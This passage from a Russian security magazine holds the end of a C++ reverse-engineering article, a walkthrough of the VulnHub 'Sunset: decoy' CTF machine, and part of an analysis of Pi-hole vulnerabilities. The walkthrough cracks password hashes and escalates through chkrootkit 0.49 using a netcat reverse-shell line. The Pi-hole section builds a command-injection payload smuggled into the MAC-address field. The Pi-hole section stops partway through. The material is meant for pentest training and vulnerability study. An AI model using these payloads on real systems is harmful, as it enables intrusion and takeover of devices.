виртуальную функцию (не конструктор!) помеща ется приблизительно сле‐
дующий код: return  new  имя  класса  (*this). Этот трюк кривее, чем
бумеранг, но... он работа ет. Разумеется, существу ют и другие решения.
  Подробное их обсуждение выходит далеко за рамки нашей беседы и тре‐
бует глубокого знания C++ (гораз до более глубокого, чем у рядового раз‐
работчика), к тому же это заняло бы слиш ком много места, но едва ли ока‐
залось бы интересным и полезным.
   Итак, идентификация виртуального конс труктора в силу отсутствия самого
понятия в принципе невозможна. Его эмуляция нас читывает десятки (если
не больше) решений, попробуй‐ка перечисли их все! Впрочем, этого и не
нужно делать, в боль шинстве случаев виртуальные конструкторы представ‐
ляют собой виртуальные функции, при нимающие в качестве аргу мента ука‐
затель this и возвращающие ука затель на новый объект. Не слишком‐то
надежно для идентификации, но все же лучше, чем ничего.


Конструктор раз, конструктор два...
Количество конструкторов у класса может быть и более одного (и очень час то
не только может, но и бывает). Однако это никак не влияет на анализ. Сколь‐
ко бы конструкторов ни присутствовало, для каж дого экземпляра класса всег‐
да вызывается только один, выб ранный компилятором в зависи мос ти от фор‐
мы его вызова. Единственная деталь — раз личные экземпля ры клас са могут
вызывать различные конструкторы. Будь внимателен!


Зачем козе баян, или Внимание: пустой конструктор!
Некоторые ограничения конструктора (в час тности, отсутс твие воз вращаемо‐
го значения) привели к появлению приема прог раммирования «пустой конс‐
труктор». Конструктор умышленно оставляется пустым, а весь код инициали‐
зации помещается в специальную функцию, как правило называемую Init.
Обсуждение сильных и слабых сторон такого стиля — предмет отдельного
разговора, никаким образом не относящегося к теме анализа. Иссле дова‐
телям достаточно знать: такой стиль есть и активно используется не только
отдельно взятыми программистами, но и крупней шими компаниями‐гиган‐
тами (например, той же Microsoft).
  Поэтому, встретив вызов пус того конс труктора, не удивляйся, это нор‐
мально, и ищи функцию инициализации среди обычных чле нов класса.
ВЗЛОМ

 СИНТЕТИЧЕСКИЙ
ЗАКАТ





                                    Вадим Голованов
                                       Работаю пентестером в FBK
                                                         Cybersecurity.
                                        Специализируюсь на услугах
                                             в области практической
                                           информационной
                                                  безопасности.
                                                 vgolovanov@fbkcs.ru



  ПРОХОДИМ ВИРТУАЛКУ SUNSET DECOY,
  ЧТОБЫ ОТТОЧИТЬ НАВЫКИ ПЕНТЕСТА





В этой статье я расскажу, как решать CTF‐задачку Sunset:
decoy, которую ты можешь скачать с VulnHub. Повторив про‐
хождение этой виртуалки вместе со мной, ты потренируешь‐
ся подбирать пароли по хешам, мониторить процессы Linux
без прав root, эксплуатировать уязвимости и передавать
файлы через бэк‐шелл.


Об авторе
Автор этой статьи — пентестер из команды FBK CyberSecurity. Это часть круп‐
нейшей рос сийской аудиторско‐консалтинговой группы ФБК (Финансовые
и  бухгалтерские консультанты). Компания специализиру ется на  услугах
в области практической информа ционной безопасности.


Автор задачки — whitecr0wz, а опуб ликована она была 7 июля 2020 года.
Машина предназначена для начина ющих, поэтому и прохождение будет
недлинным. Зато по пути я постара юсь разъяснить все шаги и рас сказать
об используемых утилитах. Мы проэкс плуатируем известную уязвимость, что‐
бы повысить привилегии и прочитать файл в каталоге root.




                   Заг руженная вир туальная машина

Не буду описывать подключение и запуск виртуальной машины, это уже
делали мои коллеги в статье «Захват Ваканды. Лома ем виртуальную машину
с VulnHub». Начнем с разведки, а точнее — с запус ка утилиты netdiscover.
   Netdiscover — простой инс трумент обна ружения (ARP‐сканер), который
удобно использовать для поиска «живых» хос тов в сети без конфигурации IP‐
адреса сетевого интерфейса.


             INFO

                    ARP  (Address  Resolution  Protocol — протокол
                      определения адреса) предназначен для опре‐
                       деления MAC‐адреса устройства по его IP‐адре‐
                            су.


По умолчанию утилиту можно запустить без парамет ров и получить результат
в виде списка устрой ств. Однако для более тонкой настройки рекомендую
ознакомиться с разными опциями, которые мож но указать при запуске.
  Целевая машина decoy находится с нами в одной подсети, поэтому просто
пишем netdiscover.





                Об наруженные сетевые адреса

Теперь мы знаем целевой IP‐адрес — это 192.168.1.123. Следующим шагом
сканируем хост и ищем открытые порты и запущенные сервисы. Просканиру‐
ем порты популярной утилитой Nmap.


nmap ‐sV ‐sC ‐O ‐p ‐ 192.168.1.123

Вот что значат наши ключи:
 • sV — вывести версии обнаруженных служб;
 • sC — использовать базовый набор скриптов для получе ния расширенной
  информации;
 • O — определить версию ОС;
 • p — сканировать весь диапа зон портов от 0 до 65 535.





          Результат ска нирования всех портов утилитой Nmap

После полного сканирования хос та мы получим два открытых порта:
 • 22 — OpenSSH Server 7.9p1;
 • 80 — Apache httpd 2.4.38.

Начнем изучать целевую машину с веб‐службы Apache. Индексная страница
на 80‐м порте выдает нам индекс каталога.





            Содержимое индексной страницы веб‐сайта

Скачиваем  единственный файл  save.zip  и  пыта емся  рас паковать  его.
В результате узнаем, что он защищен паролем.





                  Содержимое архива save.zip

Чтобы получить доступ к содержимому, нужно подоб рать пароль. Для этого
нам нужна хеш‐сигнатура файла. На помощь приходит вспомогательная ути‐
лита zip2john из состава пакета John the Ripper.





                 Выполнение ути литы zip2john

К сожалению, программа выда ет хеш, совмести мый только с «Джоном» (фор‐
мат PKZIP), использовать его в моем любимом hashcat не удастся — он любит
формат WinZIP.


             INFO

                      •John the Ripper — легендарная свободная прог‐
                        рамма, предназначен ная для восстанов ления
                        паролей по их хешам.
                       •Hashcat — это, по словам создателей, самый
                      быстрый в мире инструмент для восстанов‐
                        ления паролей.


Кто‐то предпочтет другие утилиты, но, по моему опыту, на реальных проектах
с длинными пароля ми hashcat выруча ет чаще. В данном же слу чае взлом
пароля не вызовет трудностей, пос кольку он тривиален и с легкостью под‐
дается перебору по универ сальному словарю rockyou (он входит в любой
современный наступательный дистрибутив Linux вро де Kali и Parrot).





                 Успешный подбор пароля по сло варю

Если же рассуждать о буднях пентестера в реальных условиях, то рекомендую
обратить внимание на более увесистые словари. Например, в cracksta-
tion.txt.gz содержится 15 Гбайт реальных утечек, а в hashkiller-dict.7z
еще 1,5 Гбайт.
   Теперь можем распаковать архив и ознакомиться с его содержимым.





            Успешная рас паковка архива при помощи пароля

Содержимое распакованной пап ки etc не представляет особого интереса,
кроме файла shadow. В нем содержатся наиме нования учетных записей сис‐
темы и хеши паролей. Попробуем подоб рать пароль для какого‐либо поль‐
зователя и подключиться к ранее обнаруженному порту 22 по SSH.
  Выведем командой  cat содержимое файла shadow и отфильтруем
при помощи grep поль зователей для перебора.
   Если написать grep ‐v "*", то увидим все стро ки, в которых нет звез‐
дочек, то есть пользовательские, а не служебные учетные записи.





              Выводим хеши паролей пользователей

Учетная запись systemd‐coredump к делу тоже не относится, поэтому оста‐
ются только пользователи  root и некто с длинным буквенно‐цифровым
логином.
  Проверим сразу и файл passwd из архива, чтобы узнать, какие оболочки
входа закреплены за пользователями. Как видим, наш номерной юзер имеет
ограниченную оболочку rbash (restricted shell).





                 Учетные записи с разрешенным логином

Далее можно снова использовать утилиту John the Ripper для перебора
паролей, а можно и любую другую. Тот же hashcat, в отличие от старины
«Джона», может задействовать мощ ности GPU, что немало пригождается
в реальных условиях, а в Windows у него есть гра фическая оболочка.





  Демонстрация перебора паролей формата sha512crypt утилитой hashcat
  через GUI

В нашем случае сигнатура хеша начинается с $6$ — значит, это формат SHA‐
512.


        WWW

                     •Полный список поддерживаемых хешей на сай‐
                           те hashcat


Спустя какое‐то время удается успешно подобрать пароль нашего поль‐
зователя. В отличие от логина, пароль совсем короткий — server.





              Восста новление паролей утилитой hashcat

После того как пароль найден, поп робуем подклю читься к целевой машине
по SSH, при этом укажем флаг ‐t "bash ‐‐noprofile". Это поможет обой ти
загрузку ограниченной обо лочки rbash, которая не дала бы нам переходить
в нужные каталоги.


             INFO

                  С  ключом  ‐‐noprofile  Bash  не  чита ет
                      ни общесистемный файл  начального  запуска
                   /etc/profile,  ни  любой  из  персональных
                    файлов      инициализации      пользовате ля
                   ~/.bash_profile,  ~/.bash_login   или
                   ~/.profile.





             Успешная авториза ция с подоб ранным паролем

Смотрим, что есть в катало ге текущего пользователя.





           Содержимое домашнего каталога пользователя

Тут нам на глаза попадается интересный исполня емый файл honeypot.decoy.
Что ж, запустим!





   Вызов процедуры антивирусного ска нирования из меню программы

Приложение выводит меню, которое всего лишь вызывает разные команды,
заложенные в файл. Убедиться в этом можно при помощи утилиты поиска
строк strings:


/bin/strings honeypot.decoy





       Последовательная запись команд и баннеров внутри файла

Как видим, на каждую строку меню приходится по команде. Забегая впе ред,
скажу, что инте реснее всего здесь пункт 5 — соз дание какого‐то файла.
Однако отложим пока исследование этой программы. Сначала нужно собрать
больше информации о системе.
  Смотрим остальные файлы в катало ге при помощи cat.





         Содер жимое тексто вых файлов в домаш нем каталоге

Файл log.txt оказывается журналом выполнения утилиты pspy. Это инстру мент
командной строки, предназна ченный для слежки за процессами без прав
суперпользователя root. Запомним, что использовалась эта утилита. Можно
считать, что это была подсказ ка от соз дателей виртуальной машины.





                     Начало журнала pspy

Далее по содержимому журнала увидим более интересные подробности.



                     Фрагмент журнала log.txt

Видим, что была выполнена вот такая команда:


tar ‐xvzf chkrootkit‐0.49.tar.gz

Шелл‐скрипт chkrootkit раз работан в помощь системным администраторам
и проверяет наличие известных руткитов в Linux‐системе. Пробиваем его
по exploit‐db и видим, что в нашей версии 0.49 есть серьезная уязвимость
с повышением привилегий.





            Описание уяз вимости на сайте exploit‐db.com

Локальный пользователь может получить права root, если раз дел /tmp смон‐
тирован без опции noexec. Для успешной эксплуатации можно создать в этом
каталоге файл update со своей полезной нагрузкой.
   Теперь нам надо понять, при каких условиях запус кается chkrootkit. Тут‐то
и пригодится засветившаяся рань ше утилита pspy. Попробуем проверить,
есть ли она в файловой системе виртуалки.


/usr/bin/find / ‐name pspy 2>/dev/null



      Безрезультатный поиск утилиты pspy в файловой системе цели

Как видим, файл pspy отсутс тву ет, придется загрузить его самостоятельно.
Тут возможно два варианта: можно использовать Wget и скачать напрямую
с сайта либо передать файл на машину через netcat. Рассмотрим оба случая,
так как в реальных усло виях не всегда есть выход в интернет с исследуемой
машины.
  Сам файл лежит на GitHub, найти его не сос тавило труда. В системе есть
Wget, так что можно им просто вос пользовать ся.





                      Качаем pspy32 напрямую

Второй вариант более приближен к жизни. Допус тим, иссле дуемый хост
не имеет выхода в интернет, поэто му при дется передавать файлы локаль‐
но — с машины иссле дова теля. Скачаем исполня емый файл себе на машину,
а затем начнем передавать по сети на целевую машину с помощью netcat.


             Переда ча файла с помощью утилиты netcat

На целевой машине открываем порт для прос лушивания входящих соеди‐
нений.


              Прием файлов с помощью утилиты netcat

Не забудем в обоих вариантах добавить флаг исполнения принятому файлу.


            Назначение флага исполнения командой chmod

Теперь вспомним о пятом пункте в меню ути литы honeypot.decoy. Запускаем
его, а следом нашу утилиту pspy32 для мониторинга событий.





  Фрагмент журнала pspy32 после запуска пункта AV‐Scan утилиты
  honeypot.decoy

Как видим из фрагмента выдачи pspy32, ути лита chkrootkit периодичес ки
вызывается от имени пользователя с UID, равным нулю, то есть root. Значит,
мы можем проэксплуатировать LPE (Local Privilege Escalation).
  Возвращаемся к обна руженной уязвимос ти (выполнение файла update
из каталога tmp) и используем ее, чтобы выполнить свой код с правами
суперпользователя.
  Остается  создать  прос той  реверс‐шелл,  чтобы  взаимодействовать
с основной машиной. Обмен информа цией организу ем на основе все той же
утилиты netcat буквально одной строкой скрипта. Не забудь добавить флаг
исполнения +x.


echo "/usr/bin/nc ‐e /bin/sh 192.168.1.68 666" > update
/usr/bin/chmod +x update



        Создание исполняемого файла прос того реверс‐шелла

На своей машине включаем прослушива ние входящих соединений утилитой
netcat на заранее определенном порте.


nc ‐nvlp 666





            Успешный вывод содержимого файла /root/root.txt

При появлении надписи connect сможем выполнять команды от имени супер‐
пользователя. В файле root.txt в каталоге /root находим флаг. Победа!
ВЗЛОМ
 ДЫРЫ
      В ДЫРЕ





            КАК РАБОТАЮТ
       УЯЗВИМОСТИ В PI‐HOLE,
        КОТОРЫЕ ПОЗВОЛЯЮТ
        ЗАХВАТИТЬ RASPBERRY PI




В   Pi‐hole —  популярной  программе
для блокировки рекламы и нежелательных
скриптов — за последнее время наш ли
целых три уяз вимости. Две из них приводят
к удаленному выполнению команд, а одна                aLLy                                                                                    ONsec
позволяет повысить привилегии до  root.              @iamsecurity
Давай разберем причины проблем и заод‐
но  посмотрим,  как  искать  уязвимости
в коде на PHP и скриптах на Bash.


Pi‐hole — это DNS‐сервер и небольшой веб‐интерфейс для настрой ки бло‐
кировщика и просмотра ста тистики. Приставка Pi тут нес проста, поскольку
разработчики предполагали, что ставить их софт будут на Raspberry Pi (а
заодно название звучит как «дырка для пирога»). При этом ничто в целом
не мешает ставить Pi‐hole и на дру гое железо.


Коротко о сути проблемы

CVE-2020-8816
Эта уязвимость в Pi‐hole существу ет из‐за некорректной санитизации MAC‐
адреса при добавлении его в список. Специаль но сформированный MAC‐
адрес позволяет зло умышленнику внедрить свои команды в строку вызова.
Баг затрагивает все версии Pi‐hole до 4.3.2 вклю чительно.


CVE-2020-11108
Обновление скрипта Gravity в Pi‐hole до версии 4.4 позволя ет загружать про‐
извольные файлы в веб‐директорию системы. Зло умышленник может заг‐
рузить PHP‐файл, содержащий вредонос ный код. Ошибка находится в фун‐
кции gravity_DownloadBlocklistFromUrl в файле  gravity.sh. Также она
может быть использована в сочетании с пра вилом sudo для пользователя
www‐data, чтобы повысить привилегии до суперпользователя.


Нашли уязвимости Ник Фришетт (Nick Frichette), разработчик и ИБ‐иссле‐
дователь  из  США,  и  Франсуа  Рено‐Филип пон   (François  Renaud‐
Philippon) — ИБ‐исследователь из Канады.


СТЕНД
Начнем со стенда. Тут все прос то, разработчики Pi‐Hole предоставляют офи‐
циальный контейнер Docker с дистри бути вом. Для тестирования всех уяз‐
вимостей воспользуемся версией 4.3.2.


docker run ‐‐rm ‐‐name pihole ‐‐hostname pihole ‐p80 :80 ‐p53:53
pihole/pihole:4.3.2

После непродолжительной загрузки на 80 порту можно най ти веб‐интерфейс
администратора.





                       Веб‐интерфейс Pi‐hole

Пароль будет сгенерирован в процессе загрузки контейнера и выведен
в консоль.





   Пароль администратора Pi‐hole генерируется при запус ке контей нера

Теперь осталось скачать исходники админ ской панели с GitHub  (ZIP) —
и можно приступать к раз бору уязвимости.


RCE ЧЕРЕЗ MAC-АДРЕС
Для начала обратимся к исходным кодам при ложения, раз они имеются.
В первую очередь проверим наличие RCE. Для этого поищем в коде на PHP
основные функции, которые допускают исполнение кода. Я буду исполь‐
зовать PHPStorm и сле дующую регулярку.


(exec|passthru|system|shell_exec|popen|proc_open|pcntl_exec)\s*\(

Она не идеальна, но для быс трого поиска сгодится.





             Поиск функций выполнения кода в Pi‐hole

Сразу видим, что нашлась пачка интерес ных мест. Давай посмотрим на них
поближе.
   Начнем с файла savesettings.php. Он отвечает за сох ранение нас троек
в разделе Settings, для каждой вкладки есть отдель ная ветка кода.


scripts/pi-hole/php/savesettings.php
216:        // Process request
217:        switch ($_POST["field"]) {
218:            // Set DNS server
219:            case "DNS":
...
383:            case "API":
...
548:            case "DHCP":





             Страница нас троек в веб‐интерфейсе Pi‐hole

Нас интересует вкладка DHCP, там происходит подозрительный вызов фун‐
кции exec.


scripts/pi-hole/php/savesettings.php
548:            case "DHCP":
549:
550:                if(isset($_POST["addstatic"]))
551:                {
552:                    $mac = $_POST["AddMAC"];
553:                    $ip = $_POST["AddIP"];
554:                    $hostname = $_POST["AddHostname"];
...
605:                        exec("sudo pihole ‐a addstaticdhcp ".$mac
." ".$ip." ".$hostname);

В процессе выполнения происхо дит вызов утилиты pihole, где в качестве
параметров командной строки передаются зна чения AddMAC, AddIP, Ad‐
dHostname из POST‐запроса. Первая мысль: прос то внедрить свою команду
при помощи && или ||. Одна ко переменные предварительно проходят
некоторые провер ки. Давай пос мотрим на них. Начнем с IP.


scripts/pi-hole/php/savesettings.php
562:                    if(!validIP($ip) && strlen($ip) > 0)
563:                    {
564:                        $error .= "IP address (".htmlspecialchars
($ip).") is invalid!<br>";
565:                    }

Помимо двух регулярок, выполняется проверка встроенной в PHP функцией
ﬁlter_var с опцией FILTER_VALIDATE_IP.


scripts/pi-hole/php/savesettings.php
14: function validIP($address){
15:     if (preg_match('/[.:0]/', $address) && !preg_match('/[
1‐9a‐f]/', $address)) {
16:         // Test if address contains either `:` or `0` but not
1‐9 or a‐f
17:         return false;
18:     }
19:     return !filter_var($address, FILTER_VALIDATE_IP) === false;
20: }

Здесь особо не разгуляешься, и пропих нуть левые символы не удас тся.
Тогда переходим к hostname.


scripts/pi-hole/php/savesettings.php
567:                    if(!validDomain($hostname) && strlen(
$hostname) > 0)
568:                    {
569:                        $error .= "Host name (".htmlspecialchars(
$hostname).") is invalid!<br>";
570:                    }

Тут уже три регулярки. Первая запреща ет использовать любые символы, кро‐
ме цифр, a‐z, точки, минуса и подчеркивания, а остальные проверяют длину
строки.


scripts/pi-hole/php/savesettings.php
36: function validDomain($domain_name)
37: {
38:     $validChars = preg_match("/^([_a‐z\d](‐*[_a‐z\d])*)(\.([_a‐z\
d](‐*[a‐z\d])*))*(\.([a‐z\d])*)*$/i", $domain_name);
39:     $lengthCheck = preg_match("/^.{1,253}$/", $domain_name);
40:     $labelLengthCheck = preg_match("/^[^\.]{1,63}(\.[^\.]{1,63})
*$/", $domain_name);
41:     return ( $validChars && $lengthCheck && $labelLengthCheck );
//length of each label
42: }

Здесь тоже нет возможнос ти внедрить нужные нам символы.
  Остается MAC‐адрес.


scripts/pi-hole/php/savesettings.php
556:                    if(!validMAC($mac))
557:                    {
558:                        $error .= "MAC address (".
htmlspecialchars($mac).") is invalid!<br>";
559:                    }


scripts/pi-hole/php/savesettings.php
53: function validMAC($mac_addr)
54: {
55:   // Accepted input format: 00:01:02:1A:5F:FF (characters may be
lower case)
56:   return (preg_match('/([a‐fA‐F0‐9]{2}[:]?){6}/', $mac_addr) == 1
);
57: }

А вот здесь нас ждет удача. Регулярка говорит нам, что строка дол жна содер‐
жать 6 пар символов английского алфавита и цифр и они могут быть раз‐
делены двоеточием или нет. Но вот незадача, отсутс твуют символы начала
и конца строки. Это значит, что достаточно, чтобы было как минимум одно
вхождение такой регуляр ки, а помимо нее можно указывать все что хочется.





  Некорректное регулярное выражение в Pi‐hole, которое проверяет
  валидность MAC‐адреса

Однако здесь нас поджида ет небольшая проб лемка.


scripts/pi-hole/php/savesettings.php
560:                    $mac = strtoupper($mac);

Все буквы в стро ке с MAC‐адресом переводятся в верхний регистр. Так
как команды в Linux регис трозависимы, не получит ся просто внед рить нуж‐
ную, придется искать обход. К счастью, шелл в Linux очень гиб кая шту ка
и сделать байпасс не сос тавит тру да. Если бы функция exec использовала
интерпретатор bash для выполнения команд, то решение было бы совсем
простым: начиная с четвертой версии в Bash появилась конструкция вида ${
VAR,,}, которая меняет регистр букв на строчные в значении переменной.
Но exec использует /bin/sh.





  Изменение регистра букв в Bash и ошиб ка обра ботки такой же конструк‐
  ции в sh

Но не стоит отчаиваться, ведь у нас есть переменные окружения. Всеми
любимая $PATH как раз сос тоит из букв верхнего регистра и содержит боль‐
шое количество символов нижнего. Добавим новую запись с MAC‐адресом
000000000000$PATH, чтобы увидеть содержимое этой переменной окру‐
жения.





  Добавление новой записи в DHCP, где в MAC‐адрес внедрена перемен‐
  ная окружения PATH

По умолчанию в контейнере она имеет следующий вид:


/opt/pihole:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/
bin

Чтобы не собирать всю необходимую команду из этих букв, воспользуемся
php, так как местные функции регистронеза висимы. Вот мой пейлоад:


php ‐r 'exec(strtolower("echo 1 > /tmp/owned"));'

Чтобы исклю чить любые проблемы с символами в длинных командах, можно
воспользоваться функцией hex2bin вместо strtolower, но для моего пей‐
лоада сгодится и эта.
  Получается, что нам нужны символы p, h и r. Воспользуемся символами
замены и удаления подстроки. Символ p находится на третьей позиции. Конс‐
трукция A=${PATH#??} уда лит первые два символа, и в переменной A оста‐
нется такая подстрока:


pt/pihole:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bi
n

Теперь из нее нужно удалить все, кроме первого символа, для этого исполь‐
зуем P=${A%${A#?}}.
   Теперь h. Он находится на вось мой позиции, поэтому удаляем первые
семь символов A=${PATH#???????}. Оставляем  только первый символ
при помощи уже известной нам конструкции H=${A%${A#?}}.
  И наконец — r. Удаляем все символы начиная с первого слеша до первого
двоеточия плюс три символа: A=${PATH#/*:???}. В итоге останется такая
подстрока:


r/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

Снова оставляем толь ко первый символ R=${A%${A#?}}.


        WWW

                     Подробнее про манипуляцию со строками можно
                      прочитать в мануале Bash, там все подробно рас‐
                      писано с примерами использования.


Собираем все наши конструкции вместе и получа ем:


A=${PATH#??};P=${A%${A#?}};A=${PATH#???????};H=${A%${A#?}};A=${PATH#/
*:???};R=${A%${A#?}};

Теперь в переменных $P, $H и $R находят ся буквы p, h и r в нижнем регистре.





        Создание команды php ‐r из переменной окружения PATH

Можно формировать основной пейлоад.


000000000000;A=${PATH#??};P=${A%${A#?}};A=${PATH#???????};H=${A%${A#?
}};A=${PATH#/*:???};R=${A%${A#?}};$P$H$P ‐$R 'exec(strtolower("echo 1
> /tmp/owned"));';

Отправляем его в качестве MAC‐адреса и можем видеть файл owned в дирек‐
тории /tmp.





  Удаленное выпол нение команд в Pi‐hole через внедрение команд в MAC‐
  адрес



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

     ДЫРЫ В ДЫРЕ
              КАК РАБОТАЮТ УЯЗВИМОСТИ В PI‐HOLE,
                         КОТОРЫЕ ПОЗВОЛЯЮТ
                          ЗАХВАТИТЬ RASPBERRY PI




Точно такая же проб лема присутс твует в функции удаления существу ющего
MAC‐адреса.


scripts/pi-hole/php/savesettings.php
611:                if(isset($_POST["removestatic"]))
612:                {
613:                    $mac = $_POST["removestatic"];
614:                    if(!validMAC($mac))
615:                    {
616:                        $error .= "MAC address (".
htmlspecialchars($mac).") is invalid!<br>";
617:                    }
...
618:                    $mac = strtoupper($mac);
...
622:                        exec("sudo pihole ‐a removestaticdhcp ".
$mac);

Разработчики исправили этот баг в версии 4.3.3, теперь для фильтрации
MAC‐адреса исполь зует ся встроенная функция filter_var, а также добави‐
ли новую функцию formatMAC, которая возвращает только найденную подс‐
троку с маком.


v4.3.3/scripts/pi-hole/php/savesettings.php
53: function validMAC($mac_addr)
54: {
55:   // Accepted input format: 00:01:02:1A:5F:FF (characters may be
lower case)
56:   return !filter_var($mac_addr, FILTER_VALIDATE_MAC) === false;
57: }
58:
59: function formatMAC($mac_addr)
60: {
61:     preg_match("/([0‐9a‐fA‐F]{2}[:]){5}([0‐9a‐fA‐F]{2})/",
$mac_addr, $matches);
62:     if(count($matches) > 0)
63:         return $matches[0];
64:     return null;
65: }

Но остались еще интересные места.


RCE ЧЕРЕЗ ДОБАВЛЕНИЕ В СПИСКИ
Отмотаем немного назад, до утилиты pihole. Pihole — это скрипт на Bash,
который выполняет раз ные действия, среди них такие как добавление
или удаление доменов из черного и белого спис ков и загрузка спис ка
доменов для блокирования. По дефолту она находится по пути /usr/local/
bin/pihole.





                Мес тонахождение утилиты pihole

Наш путь лежит во вкладку Blocklist раз дела Settings.





        Вкладка Blocklist раз дела Settings веб‐интерфейса Pi‐hole

В этой форме можно добавлять ссылки на списки доменов для блокирования.
Изначально там уже есть некоторые адреса, но я их удалил, чтобы упростить
тестирование. Когда ты добавишь адрес и наж мешь на кнопку Save and Up‐
date, скрипт на PHP вызывает pihole.


scripts/pi-hole/php/savesettings.php
701:            case "adlists":
...
722:                if(strlen($_POST["newuserlists"]) > 1)
723:                {
724:                    $domains = array_filter(preg_split('/\r\n|[\
r\n]/', $_POST["newuserlists"]));
725:                    foreach($domains as $domain)
726:                    {
727:                        exec("sudo pihole ‐a adlist add ".
escapeshellcmd($domain));
728:                    }
729:                }

В качестве параметров командной строки переда ется значение domain
из POST‐запроса. Оно записывается в файл /etc/pihole/adlists.list.
Посмотреть детали выполнения скрипта можно при помощи флага ‐x интер‐
претатора bash.


bash ‐x pihole ‐a adlist add http://ya.ru

Сначала происходит парсинг параметров.


pihole
443: case "${1}" in
...
463:   "‐a" | "admin"                ) webpageFunc "$@";;

Так как передан ключ ‐a, происходит вызов webpageFunc.


pihole
27: webpageFunc() {
28:   source "${PI_HOLE_SCRIPT_DIR}/webpage.sh"
29:   main "$@"
30:   exit 0
31: }





             Отладка скрипта pihole. Вызов webpageFunc

Здесь выполнение переда ется функции main и далее — CustomizeAdLists,
так как был указан аргумент adlist.


advanced/Scripts/webpage.sh
567: main() {
568:     args=("$@")
...
594:         "adlist"              ) CustomizeAdLists;;





      Отладка скрипта pihole. Вызов функций main и CustomizeAdLists

В CustomizeAdLists в зависимости от типа действия выполняется вклю‐
чение, выключение, удаление или добавление в список переданного домена
для загрузки блоклиста.


advanced/Scripts/webpage.sh
396: CustomizeAdLists() {
397:     list="/etc/pihole/adlists.list"
...
403:     elif [[ "${args[2]}" == "add" ]]; then
404:         if [[ $(grep ‐c "^${args[3]}$" "${list}") ‐eq 0 ]] ;
then
405:             echo "${args[3]}" >> ${list}





  Отладка скрип та pihole. CustomizeAdLists добавляет в список новый
  домен

После того как pihole отработал, результат воз вра щается в скрипт на PHP,
и если ты нажал именно Save and Update, то браузер редиректит на стра‐
ницу Update Gravity.


settings.php
36: <?php // Check if ad lists should be updated after saving ...
37: if (isset($_POST["submit"])) {
38:     if ($_POST["submit"] == "saveupdate") {
39:         // If that is the case ‐> refresh to the gravity page
and start updating immediately
40:         ?>
41:         <meta http‐equiv="refresh" content="1;url=gravity.php?go"
>
42:     <?php }
43: } ?>

И здесь запускается процесс обновления списков.


gravity.php
28: <script src="scripts/pi‐hole/js/gravity.js"></script>


scripts/pi-hole/js/gravity.js
59: $(function(){
...
64:     // Do we want to start updating immediately?
65:     // gravity.php?go
66:     var searchString = window.location.search.substring(1);
67:     if(searchString.indexOf("go") !== ‐1)
68:     {
69:         $("#gravityBtn").attr("disabled", true);
70:         eventsource();
71:     }

Управление переходит к скрипту gravity.sh.php.


scripts/pi-hole/js/gravity.js
07: function eventsource() {
...
18:     var source = new EventSource("scripts/pi‐hole/php/gravity.sh.
php");

Здесь мы вновь возвращаемся к утилите pihole.


scripts/pi-hole/php/gravity.sh.php
33: $proc = popen("sudo pihole ‐g", 'r');
34: while (!feof($proc)) {
35:     echoEvent(fread($proc, 4096));
36: }

Как видно из названия файла (gravity.sh.php), скрипт является обвязкой
gravity.sh.


pihole
443: case "${1}" in
...
452:   "‐g" | "updateGravity"        ) updateGravityFunc "$@";;

Именно к нему и переходит управление.


pihole
71: updateGravityFunc() {
72:   "${PI_HOLE_SCRIPT_DIR}"/gravity.sh "$@"
73:   exit $?
74: }





             Отладка скрипта pihole. Вызов updateGravity

Скрипт большой, если хочешь посмотреть детали его работы, то ты снова
можешь воспользоваться ключом ‐x.


bash ‐x /opt/pihole/gravity.sh ‐g

Нас интересует вызов функции gravity_GetBlocklistUrls.


gravity.sh
648:   gravity_GetBlocklistUrls

Здесь происходит парсинг файла /etc/pihole/adlists.list и сос тавля‐
ется список доменов, на которые нужно сходить за списками.


gravity.sh
157: gravity_GetBlocklistUrls() {
...
168:   mapfile ‐t sources <<< "$(grep ‐v ‐E "^(#|$)" "${adListFile}"
2> /dev/null)"
...
170:   # Parse source domains from $sources
171:   mapfile ‐t sourceDomains <<< "$(
172:     # Logic: Split by folder/port
173:     awk ‐F '[/:]' '{
174:       # Remove URL protocol & optional username:password@
175:       gsub(/(.*:\/\/|.*:.*@)/, "", $0)
176:       if(length($1)>0){print $1}
177:       else {print "local"}
178:     }' <<< "$(printf '%s\n' "${sources[@]}")" 2> /dev/null
179:   )"





         Отладка скрипта gravity.sh. Вызов gravity_GetBlocklistUrls

Теперь нас тало время установить настройки перед  загрузкой списков.
Это происходит в gravity_SetDownloadOptions.


gravity.sh
649:   if [[ "${haveSourceUrls}" == true ]]; then
650:     gravity_SetDownloadOptions
651:   fi


gravity.sh
194: gravity_SetDownloadOptions() {
195:   local url domain agent cmd_ext str
...
200:   for ((i = 0; i < "${#sources[@]}"; i++)); do
201:     url="${sources[$i]}"
202:     domain="${sourceDomains[$i]}"

И вызов gravity_DownloadBlocklistFromUrl выполняет непосредс твенную
загрузку.


gravity.sh
217:     if [[ "${skipDownload}" == false ]]; then
218:       echo ‐e "  ${INFO} Target: ${domain} (${url##*/})"
219:       gravity_DownloadBlocklistFromUrl "${url}" "${cmd_ext}" "${
agent}"
220:       echo ""
221:     fi

Сама загрузка происходит при помощи curl.


gravity.sh
227: gravity_DownloadBlocklistFromUrl() {
228:   local url="${1}" cmd_ext="${2}" agent="${3}"
heisenbergCompensator="" patternBuffer str httpCode success=""
...
274:     cmd_ext="‐‐resolve $domain:$port:$ip $cmd_ext"
...
277:   httpCode=$(curl ‐s ‐L ${cmd_ext} ${heisenbergCompensator} ‐w
"%{http_code}" ‐A "${agent}" "${url}" ‐o "${patternBuffer}" 2> /dev/
null)

Вот тут нужно остановиться поподробнее. Пос мотрим на команду вызова curl.
Если отбросить все, что нам не очень интересно, то она примет следующий
вид:


curl ${cmd_ext} ${heisenbergCompensator} "${url}" ‐o "${patternBuffer
}"

Можно  заметить,  что переменные  cmd_ext  и  heisenbergCompensator
не окружены кавычками, поэто му это потенциаль ное мес то, куда можно внед‐
рить что‐то. Переменная heisenbergCompensator формируется из saveLo‐
cation.


             INFO

                     Внезапная культурная отсылка: наша переменная
                       названа  в  честь  компенсатора  Гейзенберга.
                      Это вымышленное устройство, которое неким
                      образом  преодолевает  прин цип  неоп ределен‐
                         ности. В сериале Star Trek: Deep Space Nine оно
                       упоминается как один из компонентов системы
                       телепортации.



gravity.sh
